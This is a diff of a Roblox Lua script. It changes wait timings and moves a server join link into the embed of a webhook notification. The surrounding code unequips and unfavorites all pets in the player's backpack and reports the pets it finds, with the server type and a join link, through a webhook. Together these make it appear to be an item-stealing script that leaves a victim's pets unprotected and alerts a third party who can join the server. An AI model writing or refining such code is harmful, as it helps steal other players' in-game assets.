@@ -92,7 +92,7 @@ local function unfavoriteAllPetsInBackpack()
             end)
             if success and isPet then
                 favoriteRemote:FireServer(item)
-                task.wait(0.4)
+                task.wait(1)
             end
         end
     end
@@ -198,22 +198,14 @@ local function sendWebhookNotification(foundPetsData)
                         name = "🔒 Server Type",
                         value = string.format("`%s`", serverType),
                         inline = true
+                    },
+                    {
+                        name = "🔗 Server Link",
+                        value = joinLink,
+                        inline = false
                     }
                 },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }
-        },
-        components = {
-            {
-                type = 1, -- Action Row
-                components = {
-                    {
-                        type = 2, -- Button
-                        style = 5, -- Link Style
-                        label = "Join Server",
-                        url = joinLink
-                    }
-                }
             }
         }
     }
@@ -310,7 +302,7 @@ if not hoppedFromPrivate then
 end
 
 unequipAllPets()
-task.wait(0.2)
+task.wait(0.3)
 unfavoriteAllPetsInBackpack()
 
 task.wait(0)
